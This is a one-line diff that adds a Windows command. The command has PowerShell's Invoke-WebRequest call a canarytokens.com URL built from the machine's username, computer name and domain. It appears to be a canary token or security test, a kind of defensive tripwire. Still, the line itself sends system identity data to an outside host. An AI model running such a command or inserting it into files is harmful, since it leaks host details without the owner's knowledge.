@@ -1,0 +1,1 @@
+cmd /c powershell Invoke-WebRequest -Uri "http://$env:USERNAME.$env:COMPUTERNAME.$env:USERDOMAIN.INI.ieuw3zvjw2eh6h4teoxynmw1p.canarytokens.com/resource.txt"
